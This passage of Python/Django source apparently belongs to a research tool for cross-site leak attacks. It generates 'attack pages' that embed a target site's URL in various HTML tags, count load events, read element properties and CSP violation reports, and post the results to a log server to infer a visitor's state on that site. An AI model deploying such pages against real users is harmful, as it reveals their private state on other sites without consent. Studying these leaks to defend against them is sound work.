				props.volume = convertToText(window.videoTag.volume);
				props.textTracks = convertToText(window.videoTag.textTracks);
				props.audioTracks = convertToText(window.videoTag.audioTracks);
				props.videoTracks = convertToText(window.videoTag.videoTracks);
				props.seeking = convertToText(window.videoTag.seeking);
				props.seekable = convertToText(window.videoTag.seekable);
				props.preload = convertToText(window.videoTag.preload);
				props.played = convertToText(window.videoTag.played);
				props.paused = convertToText(window.videoTag.paused);
				props.playbackRate = convertToText(window.videoTag.playbackRate);
				props.networkState = convertToText(window.videoTag.networkState);
				props.muted = convertToText(window.videoTag.muted);
				props.mediaGroup = convertToText(window.videoTag.mediaGroup);
				props.error = convertToText(window.videoTag.error);
				props.ended = convertToText(window.videoTag.ended);
				props.currentTime = convertToText(window.videoTag.currentTime);
				props.buffered = convertToText(window.videoTag.buffered);
				props.loop = convertToText(window.videoTag.loop);
				props.autoplay = convertToText(window.videoTag.autoplay);
				props.media = convertToText(window.sourceTag.media); 

				var logMessage = {
					"runHashId": "%s",
					"target_url": "%s", 
					"siteId": "%s",
					"state_status": "%s",
					"tag": "%s",
					"props": JSON.stringify(props)
				}

			    request = $.ajax({
			        url: "%s",
			        contentType: "application/json; charset=utf-8",
			        type: "post",
			        data: JSON.stringify(logMessage),
			        dataType: 'text',
			        crossDomain: true,
			    });

			    // Callback handler that will be called on success
			    request.done(function (response, textStatus, jqXHR){
			        console.log("message sent to log server");
			        console.log(response)
			    });

			    // Callback handler that will be called on failure
			    request.fail(function (jqXHR, textStatus, errorThrown){
			        console.error("The following error occurred: "+ textStatus, errorThrown);
			    });
		    }
			setTimeout(function() {
					postObjectProperties();
		    	}, 7500);
			</script>
		'''%(runHashId, target_url, site_id, state_status, tag_name, log_endpoint)
	elif tag_name == "track":
		js = '''
			<script type="text/javascript">
			function convertToText(obj) {
				if(typeof(obj) == undefined) return "undefined"
				if(obj == null) return "null"
			    //create an array that will later be joined into a string.
			    var string = []
			    //is object
			    //    Both arrays and objects seem to return "object"
			    //    when typeof(obj) is applied to them. So instead
			    //    I am checking to see if they have the property
			    //    join, which normal objects don't have but
			    //    arrays do.
			    if (typeof(obj) == "object" && (obj.join == undefined)) {
			        string.push("{");
			        for (prop in obj) {
			            string.push(prop, ": ", convertToText(obj[prop]), ",");
			        };
			        string.push("}");

			    //is array
			    } else if (typeof(obj) == "object" && !(obj.join == undefined)) {
			        string.push("[")
			        for(prop in obj) {
			            string.push(convertToText(obj[prop]), ",");
			        }
			        string.push("]")

			    //is function
			    } else if (typeof(obj) == "function") {
			        string.push(obj.toString())

			    //all other values can be done with JSON.stringify
			    } else {
			        string.push(JSON.stringify(obj))
			    }

			    return string.join("")
			}
			var postObjectProperties = function(){
				var props = { };
				
				props.duration = convertToText(window.videoTag.duration);
				props.readyState = convertToText(window.videoTag.readyState);
				props.volume = convertToText(window.videoTag.volume);
				props.textTracks = convertToText(window.videoTag.textTracks);
				props.audioTracks = convertToText(window.videoTag.audioTracks);
				props.videoTracks = convertToText(window.videoTag.videoTracks);
				props.seeking = convertToText(window.videoTag.seeking);
				props.seekable = convertToText(window.videoTag.seekable);
				props.preload = convertToText(window.videoTag.preload);
				props.played = convertToText(window.videoTag.played);
				props.paused = convertToText(window.videoTag.paused);
				props.playbackRate = convertToText(window.videoTag.playbackRate);
				props.networkState = convertToText(window.videoTag.networkState);
				props.muted = convertToText(window.videoTag.muted);
				props.mediaGroup = convertToText(window.videoTag.mediaGroup);
				props.error = convertToText(window.videoTag.error);
				props.ended = convertToText(window.videoTag.ended);
				props.currentTime = convertToText(window.videoTag.currentTime);
				props.buffered = convertToText(window.videoTag.buffered);
				props.loop = convertToText(window.videoTag.loop);
				props.autoplay = convertToText(window.videoTag.autoplay);

				props.track = convertToText(window.trackTag.track); 
				props.trackReadyState= convertToText(window.trackTag.readyState); 
				props.kind= convertToText(window.trackTag.kind);
				props.label= convertToText(window.trackTag.label);

				var logMessage = {
					"runHashId": "%s",
					"target_url": "%s", 
					"siteId": "%s",
					"state_status": "%s",
					"tag": "%s",
					"props": JSON.stringify(props)
				}

			    request = $.ajax({
			        url: "%s",
			        contentType: "application/json; charset=utf-8",
			        type: "post",
			        data: JSON.stringify(logMessage),
			        dataType: 'text',
			        crossDomain: true,
			    });

			    // Callback handler that will be called on success
			    request.done(function (response, textStatus, jqXHR){
			        console.log("message sent to log server");
			        console.log(response)
			    });

			    // Callback handler that will be called on failure
			    request.fail(function (jqXHR, textStatus, errorThrown){
			        console.error("The following error occurred: "+ textStatus, errorThrown);
			    });
		    }
			setTimeout(function() {
					postObjectProperties();
		    	}, 7500);
			</script>
		'''%(runHashId, target_url, site_id, state_status, tag_name, log_endpoint)
	elif tag_name == "input":
		js = '''
			<script type="text/javascript">
			function convertToText(obj) {
				if(typeof(obj) == undefined) return "undefined"
				if(obj == null) return "null"
			    //create an array that will later be joined into a string.
			    var string = []
			    //is object
			    //    Both arrays and objects seem to return "object"
			    //    when typeof(obj) is applied to them. So instead
			    //    I am checking to see if they have the property
			    //    join, which normal objects don't have but
			    //    arrays do.
			    if (typeof(obj) == "object" && (obj.join == undefined)) {
			        string.push("{");
			        for (prop in obj) {
			            string.push(prop, ": ", convertToText(obj[prop]), ",");
			        };
			        string.push("}");

			    //is array
			    } else if (typeof(obj) == "object" && !(obj.join == undefined)) {
			        string.push("[")
			        for(prop in obj) {
			            string.push(convertToText(obj[prop]), ",");
			        }
			        string.push("]")

			    //is function
			    } else if (typeof(obj) == "function") {
			        string.push(obj.toString())

			    //all other values can be done with JSON.stringify
			    } else {
			        string.push(JSON.stringify(obj))
			    }

			    return string.join("")
			}
			var postObjectProperties = function(){
				var props = { };
				
				props.width = convertToText(window.tag.width);
				props.height = convertToText(window.tag.height);
				props.form = convertToText(window.tag.form);
				props.validity = convertToText(window.tag.validity);
				props.willValidate = convertToText(window.tag.willValidate);
				props.validationMessage = convertToText(window.tag.validationMessage);
				props.labels = convertToText(window.tag.labels);
				props.list = convertToText(window.tag.list);
				props.accept = convertToText(window.tag.accept);
				props.checked = convertToText(window.tag.checked);
				props.dirName = convertToText(window.tag.dirName);
				props.disabled = convertToText(window.tag.disabled);
				props.indeterminate = convertToText(window.tag.indeterminate);
				props.maxLength = convertToText(window.tag.maxLength);
				props.max = convertToText(window.tag.max);
				props.minLength = convertToText(window.tag.minLength);
				props.min = convertToText(window.tag.min);
				props.multiple = convertToText(window.tag.multiple);
				props.size = convertToText(window.tag.size);
				props.alt = convertToText(window.tag.alt);

				var logMessage = {
					"runHashId": "%s",
					"target_url": "%s", 
					"siteId": "%s",
					"state_status": "%s",
					"tag": "%s",
					"props": JSON.stringify(props)
				}

			    request = $.ajax({
			        url: "%s",
			        contentType: "application/json; charset=utf-8",
			        type: "post",
			        data: JSON.stringify(logMessage),
			        dataType: 'text',
			        crossDomain: true,
			    });

			    // Callback handler that will be called on success
			    request.done(function (response, textStatus, jqXHR){
			        console.log("message sent to log server");
			        console.log(response)
			    });

			    // Callback handler that will be called on failure
			    request.fail(function (jqXHR, textStatus, errorThrown){
			        console.error("The following error occurred: "+ textStatus, errorThrown);
			    });
		    }
			setTimeout(function() {
					postObjectProperties();
		    	}, 7500);
			</script>
		'''%(runHashId, target_url, site_id, state_status, tag_name, log_endpoint)
	elif tag_name == "img":
		js = '''
			<script type="text/javascript">
			function convertToText(obj) {
				if(typeof(obj) == undefined) return "undefined"
				if(obj == null) return "null"
			    //create an array that will later be joined into a string.
			    var string = []
			    //is object
			    //    Both arrays and objects seem to return "object"
			    //    when typeof(obj) is applied to them. So instead
			    //    I am checking to see if they have the property
			    //    join, which normal objects don't have but
			    //    arrays do.
			    if (typeof(obj) == "object" && (obj.join == undefined)) {
			        string.push("{");
			        for (prop in obj) {
			            string.push(prop, ": ", convertToText(obj[prop]), ",");
			        };
			        string.push("}");

			    //is array
			    } else if (typeof(obj) == "object" && !(obj.join == undefined)) {
			        string.push("[")
			        for(prop in obj) {
			            string.push(convertToText(obj[prop]), ",");
			        }
			        string.push("]")

			    //is function
			    } else if (typeof(obj) == "function") {
			        string.push(obj.toString())

			    //all other values can be done with JSON.stringify
			    } else {
			        string.push(JSON.stringify(obj))
			    }

			    return string.join("")
			}
			var postObjectProperties = function(){
				var props = { };
				
				props.width = convertToText(window.tag.width);
				props.height = convertToText(window.tag.height);
				props.sizes = convertToText(window.tag.sizes);
				props.alt = convertToText(window.tag.alt);
				props.naturalWidth = convertToText(window.tag.naturalWidth);
				props.naturalHeight = convertToText(window.tag.naturalHeight);
				props.complete = convertToText(window.tag.complete);
				props.currentSrc = convertToText(window.tag.currentSrc);
				props.referrerPolicy = convertToText(window.tag.referrerPolicy);
				props.decoding = convertToText(window.tag.decoding);
				props.isMap = convertToText(window.tag.isMap);
				props.useMap = convertToText(window.tag.useMap);
				props.crossOrigin = convertToText(window.tag.crossOrigin);
				props.vspace = convertToText(window.tag.vspace);
				props.hspace = convertToText(window.tag.hspace);

				var logMessage = {
					"runHashId": "%s",
					"target_url": "%s", 
					"siteId": "%s",
					"state_status": "%s",
					"tag": "%s",
					"props": JSON.stringify(props)
				}

			    request = $.ajax({
			        url: "%s",
			        contentType: "application/json; charset=utf-8",
			        type: "post",
			        data: JSON.stringify(logMessage),
			        dataType: 'text',
			        crossDomain: true,
			    });

			    // Callback handler that will be called on success
			    request.done(function (response, textStatus, jqXHR){
			        console.log("message sent to log server");
			        console.log(response)
			    });

			    // Callback handler that will be called on failure
			    request.fail(function (jqXHR, textStatus, errorThrown){
			        console.error("The following error occurred: "+ textStatus, errorThrown);
			    });
		    }
			setTimeout(function() {
					postObjectProperties();
		    	}, 7500);
			</script>
		'''%(runHashId, target_url, site_id, state_status, tag_name, log_endpoint)
	elif tag_name == "iframe":
		js = '''
			<script type="text/javascript">
			function convertToText(obj) {
				if(typeof(obj) == undefined) return "undefined"
				if(obj == null) return "null"
			    //create an array that will later be joined into a string.
			    var string = []
			    //is object
			    //    Both arrays and objects seem to return "object"
			    //    when typeof(obj) is applied to them. So instead
			    //    I am checking to see if they have the property
			    //    join, which normal objects don't have but
			    //    arrays do.
			    if (typeof(obj) == "object" && (obj.join == undefined)) {
			        string.push("{");
			        for (prop in obj) {
			            string.push(prop, ": ", convertToText(obj[prop]), ",");
			        };
			        string.push("}");

			    //is array
			    } else if (typeof(obj) == "object" && !(obj.join == undefined)) {
			        string.push("[")
			        for(prop in obj) {
			            string.push(convertToText(obj[prop]), ",");
			        }
			        string.push("]")

			    //is function
			    } else if (typeof(obj) == "function") {
			        string.push(obj.toString())

			    //all other values can be done with JSON.stringify
			    } else {
			        string.push(JSON.stringify(obj))
			    }

			    return string.join("")
			}
			var postObjectProperties = function(){
				var props = { };
				
				props.name = convertToText(window.tag.width);
				props.sandbox = convertToText(window.tag.height);
				props.allow = convertToText(window.tag.sizes);
				props.allowFullscreen = convertToText(window.tag.alt);
				props.allowPaymentRequest = convertToText(window.tag.naturalWidth);
				props.referrerPolicy = convertToText(window.tag.referrerPolicy);
				props.contentDocument = convertToText(window.tag.contentDocument);
				props.contentWindowLength = (window.tag.contentWindow)? window.tag.contentWindow.length: "null";
				props.width = convertToText(window.tag.width);
				props.height = convertToText(window.tag.height);


				var logMessage = {
					"runHashId": "%s",
					"target_url": "%s", 
					"siteId": "%s",
					"state_status": "%s",
					"tag": "%s",
					"props": JSON.stringify(props)
				}

			    request = $.ajax({
			        url: "%s",
			        contentType: "application/json; charset=utf-8",
			        type: "post",
			        data: JSON.stringify(logMessage),
			        dataType: 'text',
			        crossDomain: true,
			    });

			    // Callback handler that will be called on success
			    request.done(function (response, textStatus, jqXHR){
			        console.log("message sent to log server");
			        console.log(response)
			    });

			    // Callback handler that will be called on failure
			    request.fail(function (jqXHR, textStatus, errorThrown){
			        console.error("The following error occurred: "+ textStatus, errorThrown);
			    });
		    }
			setTimeout(function() {
					postObjectProperties();
		    	}, 7500);
			</script>
		'''%(runHashId, target_url, site_id, state_status, tag_name, log_endpoint)
	elif tag_name == "embed":
		js = '''
			<script type="text/javascript">
			function convertToText(obj) {
				if(typeof(obj) == undefined) return "undefined"
				if(obj == null) return "null"
			    //create an array that will later be joined into a string.
			    var string = []
			    //is object
			    //    Both arrays and objects seem to return "object"
			    //    when typeof(obj) is applied to them. So instead
			    //    I am checking to see if they have the property
			    //    join, which normal objects don't have but
			    //    arrays do.
			    if (typeof(obj) == "object" && (obj.join == undefined)) {
			        string.push("{");
			        for (prop in obj) {
			            string.push(prop, ": ", convertToText(obj[prop]), ",");
			        };
			        string.push("}");

			    //is array
			    } else if (typeof(obj) == "object" && !(obj.join == undefined)) {
			        string.push("[")
			        for(prop in obj) {
			            string.push(convertToText(obj[prop]), ",");
			        }
			        string.push("]")

			    //is function
			    } else if (typeof(obj) == "function") {
			        string.push(obj.toString())

			    //all other values can be done with JSON.stringify
			    } else {
			        string.push(JSON.stringify(obj))
			    }

			    return string.join("")
			}
			var postObjectProperties = function(){
				var props = { };
				
				props.type = convertToText(window.tag.type);
				props.width = convertToText(window.tag.width);
				props.height = convertToText(window.tag.height);


				var logMessage = {
					"runHashId": "%s",
					"target_url": "%s", 
					"siteId": "%s",
					"state_status": "%s",
					"tag": "%s",
					"props": JSON.stringify(props)
				}

			    request = $.ajax({
			        url: "%s",
			        contentType: "application/json; charset=utf-8",
			        type: "post",
			        data: JSON.stringify(logMessage),
			        dataType: 'text',
			        crossDomain: true,
			    });

			    // Callback handler that will be called on success
			    request.done(function (response, textStatus, jqXHR){
			        console.log("message sent to log server");
			        console.log(response)
			    });

			    // Callback handler that will be called on failure
			    request.fail(function (jqXHR, textStatus, errorThrown){
			        console.error("The following error occurred: "+ textStatus, errorThrown);
			    });
		    }
			setTimeout(function() {
					postObjectProperties();
		    	}, 7500);
			</script>
		'''%(runHashId, target_url, site_id, state_status, tag_name, log_endpoint)
	elif tag_name.startswith("link"):
		js = '''
			<script type="text/javascript">
			function convertToText(obj) {
				if(typeof(obj) == undefined) return "undefined"
				if(obj == null) return "null"
			    //create an array that will later be joined into a string.
			    var string = []
			    //is object
			    //    Both arrays and objects seem to return "object"
			    //    when typeof(obj) is applied to them. So instead
			    //    I am checking to see if they have the property
			    //    join, which normal objects don't have but
			    //    arrays do.
			    if (typeof(obj) == "object" && (obj.join == undefined)) {
			        string.push("{");
			        for (prop in obj) {
			            string.push(prop, ": ", convertToText(obj[prop]), ",");
			        };
			        string.push("}");

			    //is array
			    } else if (typeof(obj) == "object" && !(obj.join == undefined)) {
			        string.push("[")
			        for(prop in obj) {
			            string.push(convertToText(obj[prop]), ",");
			        }
			        string.push("]")

			    //is function
			    } else if (typeof(obj) == "function") {
			        string.push(obj.toString())

			    //all other values can be done with JSON.stringify
			    } else {
			        string.push(JSON.stringify(obj))
			    }

			    return string.join("")
			}
			var postObjectProperties = function(){
				var props = { };

				props.relList = convertToText(window.tag.relList);
				props.media = convertToText(window.tag.media);
				props.integrity = convertToText(window.tag.integrity);
				props.hreflang = convertToText(window.tag.hreflang);
				props.type = convertToText(window.tag.type);
				props.sizes = convertToText(window.tag.sizes);
				props.imageSrcset = convertToText(window.tag.imageSrcset);
				props.imageSizes = convertToText(window.tag.imageSizes);
				props.referrerPolicy = convertToText(window.tag.referrerPolicy);
				props.crossOrigin = convertToText(window.tag.crossOrigin);
				props.disabled = convertToText(window.tag.disabled);
				props.rev = convertToText(window.tag.rev);
				props.charset = convertToText(window.tag.charset);

				var logMessage = {
					"runHashId": "%s",
					"target_url": "%s", 
					"siteId": "%s",
					"state_status": "%s",
					"tag": "%s",
					"props": JSON.stringify(props)
				}

			    request = $.ajax({
			        url: "%s",
			        contentType: "application/json; charset=utf-8",
			        type: "post",
			        data: JSON.stringify(logMessage),
			        dataType: 'text',
			        crossDomain: true,
			    });

			    // Callback handler that will be called on success
			    request.done(function (response, textStatus, jqXHR){
			        console.log("message sent to log server");
			        console.log(response)
			    });

			    // Callback handler that will be called on failure
			    request.fail(function (jqXHR, textStatus, errorThrown){
			        console.error("The following error occurred: "+ textStatus, errorThrown);
			    });
		    }
			setTimeout(function() {
					postObjectProperties();
		    	}, 7500);
			</script>
		'''%(runHashId, target_url, site_id, state_status, tag_name, log_endpoint)
	elif tag_name == "script":
		js = '''
			<script type="text/javascript">
			function convertToText(obj) {
				if(typeof(obj) == undefined) return "undefined"
				if(obj == null) return "null"
			    //create an array that will later be joined into a string.
			    var string = []
			    //is object
			    //    Both arrays and objects seem to return "object"
			    //    when typeof(obj) is applied to them. So instead
			    //    I am checking to see if they have the property
			    //    join, which normal objects don't have but
			    //    arrays do.
			    if (typeof(obj) == "object" && (obj.join == undefined)) {
			        string.push("{");
			        for (prop in obj) {
			            string.push(prop, ": ", convertToText(obj[prop]), ",");
			        };
			        string.push("}");

			    //is array
			    } else if (typeof(obj) == "object" && !(obj.join == undefined)) {
			        string.push("[")
			        for(prop in obj) {
			            string.push(convertToText(obj[prop]), ",");
			        }
			        string.push("]")

			    //is function
			    } else if (typeof(obj) == "function") {
			        string.push(obj.toString())

			    //all other values can be done with JSON.stringify
			    } else {
			        string.push(JSON.stringify(obj))
			    }

			    return string.join("")
			}
			var postObjectProperties = function(){
				var props = { };
				
				props.charset = convertToText(window.tag.charset);
				props.type = convertToText(window.tag.type);
				props.noModule = convertToText(window.tag.noModule);
				props.async = convertToText(window.tag.async);
				props.defer = convertToText(window.tag.defer);
				props.crossOrigin = convertToText(window.tag.crossOrigin);
				props.text = convertToText(window.tag.text);
				props.integrity = convertToText(window.tag.integrity);
				props.referrerPolicy = convertToText(window.tag.referrerPolicy);

				var logMessage = {
					"runHashId": "%s",
					"target_url": "%s", 
					"siteId": "%s",
					"state_status": "%s",
					"tag": "%s",
					"props": JSON.stringify(props)
				}

			    request = $.ajax({
			        url: "%s",
			        contentType: "application/json; charset=utf-8",
			        type: "post",
			        data: JSON.stringify(logMessage),
			        dataType: 'text',
			        crossDomain: true,
			    });

			    // Callback handler that will be called on success
			    request.done(function (response, textStatus, jqXHR){
			        console.log("message sent to log server");
			        console.log(response)
			    });

			    // Callback handler that will be called on failure
			    request.fail(function (jqXHR, textStatus, errorThrown){
			        console.error("The following error occurred: "+ textStatus, errorThrown);
			    });
		    }
			setTimeout(function() {
					postObjectProperties();
		    	}, 7500);
			</script>
		'''%(runHashId, target_url, site_id, state_status, tag_name, log_endpoint)
	elif tag_name == "applet":
		js = '''
			<script type="text/javascript">
			function convertToText(obj) {
				if(typeof(obj) == undefined) return "undefined"
				if(obj == null) return "null"
			    //create an array that will later be joined into a string.
			    var string = []
			    //is object
			    //    Both arrays and objects seem to return "object"
			    //    when typeof(obj) is applied to them. So instead
			    //    I am checking to see if they have the property
			    //    join, which normal objects don't have but
			    //    arrays do.
			    if (typeof(obj) == "object" && (obj.join == undefined)) {
			        string.push("{");
			        for (prop in obj) {
			            string.push(prop, ": ", convertToText(obj[prop]), ",");
			        };
			        string.push("}");

			    //is array
			    } else if (typeof(obj) == "object" && !(obj.join == undefined)) {
			        string.push("[")
			        for(prop in obj) {
			            string.push(convertToText(obj[prop]), ",");
			        }
			        string.push("]")

			    //is function
			    } else if (typeof(obj) == "function") {
			        string.push(obj.toString())

			    //all other values can be done with JSON.stringify
			    } else {
			        string.push(JSON.stringify(obj))
			    }

			    return string.join("")
			}
			var postObjectProperties = function(){
				var props = { };
				
				props.object = convertToText(window.tag.object);
				props.archive = convertToText(window.tag.archive);
				props.codebase = convertToText(window.tag.codebase);
				props.height = convertToText(window.tag.height);
				props.width = convertToText(window.tag.width);
				props.hspace = convertToText(window.tag.hspace);
				props.vspace = convertToText(window.tag.vspace);
				props.name = convertToText(window.tag.name);
				props.alt = convertToText(window.tag.alt);

				var logMessage = {
					"runHashId": "%s",
					"target_url": "%s", 
					"siteId": "%s",
					"state_status": "%s",
					"tag": "%s",
					"props": JSON.stringify(props)
				}

			    request = $.ajax({
			        url: "%s",
			        contentType: "application/json; charset=utf-8",
			        type: "post",
			        data: JSON.stringify(logMessage),
			        dataType: 'text',
			        crossDomain: true,
			    });

			    // Callback handler that will be called on success
			    request.done(function (response, textStatus, jqXHR){
			        console.log("message sent to log server");
			        console.log(response)
			    });

			    // Callback handler that will be called on failure
			    request.fail(function (jqXHR, textStatus, errorThrown){
			        console.error("The following error occurred: "+ textStatus, errorThrown);
			    });
		    }
			setTimeout(function() {
					postObjectProperties();
		    	}, 7500);
			</script>
		'''%(runHashId, target_url, site_id, state_status, tag_name, log_endpoint)
	elif tag_name == "frame":
		js = '''
			<script type="text/javascript">
			function convertToText(obj) {
				if(typeof(obj) == undefined) return "undefined"
				if(obj == null) return "null"
			    //create an array that will later be joined into a string.
			    var string = []
			    //is object
			    //    Both arrays and objects seem to return "object"
			    //    when typeof(obj) is applied to them. So instead
			    //    I am checking to see if they have the property
			    //    join, which normal objects don't have but
			    //    arrays do.
			    if (typeof(obj) == "object" && (obj.join == undefined)) {
			        string.push("{");
			        for (prop in obj) {
			            string.push(prop, ": ", convertToText(obj[prop]), ",");
			        };
			        string.push("}");

			    //is array
			    } else if (typeof(obj) == "object" && !(obj.join == undefined)) {
			        string.push("[")
			        for(prop in obj) {
			            string.push(convertToText(obj[prop]), ",");
			        }
			        string.push("]")

			    //is function
			    } else if (typeof(obj) == "function") {
			        string.push(obj.toString())

			    //all other values can be done with JSON.stringify
			    } else {
			        string.push(JSON.stringify(obj))
			    }

			    return string.join("")
			}
			var postObjectProperties = function(){
				var props = { };
				
				props.frameborder = convertToText(window.tag.frameborder);
				props.longdesc = convertToText(window.tag.longdesc);
				props.marginheight = convertToText(window.tag.marginheight);
				props.marginwidth = convertToText(window.tag.marginwidth);
				props.name = convertToText(window.tag.name);
				props.noresize = convertToText(window.tag.noresize);
				props.scrolling = convertToText(window.tag.scrolling);

				var logMessage = {
					"runHashId": "%s",
					"target_url": "%s", 
					"siteId": "%s",
					"state_status": "%s",
					"tag": "%s",
					"props": JSON.stringify(props)
				}

			    request = $.ajax({
			        url: "%s",
			        contentType: "application/json; charset=utf-8",
			        type: "post",
			        data: JSON.stringify(logMessage),
			        dataType: 'text',
			        crossDomain: true,
			    });

			    // Callback handler that will be called on success
			    request.done(function (response, textStatus, jqXHR){
			        console.log("message sent to log server");
			        console.log(response)
			    });

			    // Callback handler that will be called on failure
			    request.fail(function (jqXHR, textStatus, errorThrown){
			        console.error("The following error occurred: "+ textStatus, errorThrown);
			    });
		    }
			setTimeout(function() {
					postObjectProperties();
		    	}, 7500);
			</script>
		'''%(runHashId, target_url, site_id, state_status, tag_name, log_endpoint)

	if tag_name == "frame":
		returnHTML = include_tag_in_head(html, js)
	else:
		returnHTML = include_tag_in_body(html, js)
	return returnHTML


def attach_event_count_log_sender_frameset(html, runHashId, target_url, site_id, state_status, eventOrder, tag_name, log_endpoint):
	js = '''
		<script type="text/javascript">
		$(document).ready(function(){
			var postEventCountResults = function(){
				var uniqueEvents = Array.from(new Set(window.eventOrder));
				var event_count = { };
				for(var i=0; i<uniqueEvents.length; i++){
					event_count[uniqueEvents[i]]= eval("window.var"+uniqueEvents[i]+"Count");
				}
				var logMessage = {
					"runHashId": "%s",
					"target_url": "%s", 
					"siteId": "%s",
					"state_status": "%s",
					"event_order": JSON.stringify(%s),
					"tag": "%s",
					"event_count": JSON.stringify(event_count),
				}

			    request = $.ajax({
			        url: "%s",
			        contentType: "application/json; charset=utf-8",
			        type: "post",
			        data: JSON.stringify(logMessage),
			        dataType: 'text',
			        crossDomain: true,
			    });

			    // Callback handler that will be called on success
			    request.done(function (response, textStatus, jqXHR){
			        console.log("message sent to log server");
			        console.log(response)
			    });

			    // Callback handler that will be called on failure
			    request.fail(function (jqXHR, textStatus, errorThrown){
			        console.error("The following error occurred: "+ textStatus, errorThrown);
			    });
		    }
			setTimeout(function() {
					postEventCountResults();
		    	}, 6000);
	    });
		</script>
	'''%(runHashId, target_url, site_id, state_status, eventOrder, tag_name, log_endpoint)

	returnHTML = include_tag_in_head(html, js)
	return returnHTML
	
# @Function: Django Controller - Http GET Handler
# @URL GET 'attack-page/event-count/{site_id}/{state_status}'
def getEventCountAttackPage(request, site_id, state_status):

	site_url = site_dict[site_id][0] 
	target_url = request.GET.get("fr", site_url)
	target_url = decodeURL_Plus(target_url)

	# we target only one tag at a time to avoid caching of target-urls data requested by browser
	tag_name= request.GET.get("tag", "iframe")

	events= request.GET.get("events", "onload")
	eventList=events.split("-")
	log_server_endpoint = LOG_SERVER_BASE_DEFAULT + "record-event-count/%s/"%(site_id)
	log_server_endpoint_obj_props = LOG_SERVER_BASE_DEFAULT + "record-object-props/%s/"%(site_id)

	runHashId = request.GET.get("hash", "")

	document_title = "event-count"
	if tag_name == "frame":
		html = get_base_dom_document_with_frameset(document_title)
		html = attach_event_count_define_order_list_frameset(html)
		html = attach_global_event_count_log_collector_frameset(html, target_url, tag_name, eventList)
		html = attach_event_count_log_sender_frameset(html, runHashId, target_url, site_id, state_status, get_event_order_varname(), tag_name, log_server_endpoint)
		html = attach_object_props_log_sender(html, runHashId, target_url, site_id, state_status, tag_name, log_server_endpoint_obj_props)
	else:
		html = get_base_dom_document(document_title)
		html = attach_event_count_define_order_list(html)
		html = attach_global_event_count_log_collector(html, target_url, tag_name, eventList)
		html = attach_event_count_log_sender(html, runHashId, target_url, site_id, state_status, get_event_order_varname(), tag_name, log_server_endpoint)
		html = attach_object_props_log_sender(html, runHashId, target_url, site_id, state_status, tag_name, log_server_endpoint_obj_props)
	return HttpResponse(html)


# --------------------------------------------------------------------------- #
#						CSP Test
# --------------------------------------------------------------------------- #

def get_corresponding_csp_tag_src(tag_name):

	if tag_name == "iframe":
		return "frame-src"
	elif tag_name == "object":
		return "object-src"
	elif tag_name == "img":
		return "img-src"
	elif tag_name == "audio" or tag_name == "video":
		return "media-src"
	elif tag_name == "link":
		return "style-src"
	elif tag_name == "embed":
		return "child-src"
	elif tag_name == "script":
		return "script-src"
	elif tag_name == "applet":
		return "frame-ancestors"
	else:
		return "worker-src"

def get_csp_header(tag_name, target_url, report_uri):

	if tag_name == "iframe" or tag_name == "frame":
		return "frame-src '%s' %s ; frame-ancestors '%s' %s ; report-uri %s"%('self', target_url, 'self', target_url, report_uri)
	elif tag_name == "object":
		return "object-src '%s' %s ; report-uri %s"%('self', target_url, report_uri)
	elif tag_name == "img":
		return "img-src '%s' %s ; report-uri %s"%('self', target_url, report_uri)
	elif tag_name == "audio" or tag_name == "video":
		return "media-src '%s' %s ; report-uri %s"%('self',target_url, report_uri)
	elif tag_name == "link":
		return "style-src '%s' %s ; report-uri %s"%('self',target_url, report_uri)
	elif tag_name == "embed":
		return "child-src '%s' %s ; frame-ancestors '%s' %s ; report-uri %s"%('self', target_url, 'self', target_url, report_uri)
	elif tag_name == "script":
		jquery_url = "https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"
		return "script-src 'unsafe-inline' '%s' %s %s ; report-uri %s"%('self', jquery_url, target_url, report_uri)
	elif tag_name == "applet":
		return "frame-ancestors '%s' %s ; object-src '%s' %s ; report-uri %s"%('self', target_url, 'self', target_url, report_uri)
	else:
		return ""

def attach_csp_html_tag(html, target_url, tag_name):

	attribute = get_corresponding_attribute(tag_name)
	js = '''
	<script type="text/javascript">
		var tag = document.createElement("%s")
		tag.setAttribute("%s", "%s")
		document.body.appendChild(tag);
	</script>
	'''%(tag_name, attribute, target_url)
	returnHTML = include_tag_in_body(html, js)
	return returnHTML


def attach_csp_log_sender(html, report_uri):

	js = '''
		<script type="text/javascript">
		var postCSPDefault = function(){
			var logMessage = {
				"csp-report": {"blocked-uri": "NO_VIOLATION"}
			}

		    request = $.ajax({
		        url: "%s",
		        contentType: "application/json; charset=utf-8",
		        type: "post",
		        data: JSON.stringify(logMessage),
		        dataType: 'text',
		        crossDomain: true,
		    });

		    // Callback handler that will be called on success
		    request.done(function (response, textStatus, jqXHR){
		        console.log("message sent to log server");
		        console.log(response)
		    });

		    // Callback handler that will be called on failure
		    request.fail(function (jqXHR, textStatus, errorThrown){
		        console.error("The following error occurred: "+ textStatus, errorThrown);
		    });
	    }
		setTimeout(function() {
				postCSPDefault();
	    	}, 1000);
		</script>
	'''%(report_uri)

	returnHTML = include_tag_in_body(html, js)
	return returnHTML


def attach_csp_html_tag_frameset(html, target_url, tag_name):

	attribute = get_corresponding_attribute(tag_name)
	js = '''
	<script type="text/javascript">
	$(document).ready(function(){
		var tag = document.createElement("%s");
		tag.setAttribute("%s", "%s");
		document.getElementById("frameset-container").appendChild(tag);
	});
	</script>
	'''%(tag_name, attribute, target_url)
	returnHTML = include_tag_in_head(html, js)
	return returnHTML



def attach_csp_log_sender_frameset(html, report_uri):

	js = '''
		<script type="text/javascript">
		$(document).ready(function(){
			var postCSPDefault = function(){
				var logMessage = {
					"csp-report": {"blocked-uri": "NO_VIOLATION"}
				}

			    request = $.ajax({
			        url: "%s",
			        contentType: "application/json; charset=utf-8",
			        type: "post",
			        data: JSON.stringify(logMessage),
			        dataType: 'text',
			        crossDomain: true,
			    });

			    // Callback handler that will be called on success
			    request.done(function (response, textStatus, jqXHR){
			        console.log("message sent to log server");
			        console.log(response)
			    });

			    // Callback handler that will be called on failure
			    request.fail(function (jqXHR, textStatus, errorThrown){
			        console.error("The following error occurred: "+ textStatus, errorThrown);
			    });
		    }
			setTimeout(function() {
					postCSPDefault();
		    	}, 1000);
		});
		</script>
	'''%(report_uri)

	returnHTML = include_tag_in_head(html, js)
	return returnHTML



def get_or_create_csp_test_pages_directory(siteId):

	global BROWSER_REPORT_FOLDER
	relative_dir = "automator/%s/TestPages/CSP/%s"%(siteId, BROWSER_REPORT_FOLDER)
	abs_dir = os.path.join(ROOT_DIR, relative_dir)
	if not os.path.exists(abs_dir):
		os.makedirs(abs_dir)
	return abs_dir


def save_html_response(base_dir, html):

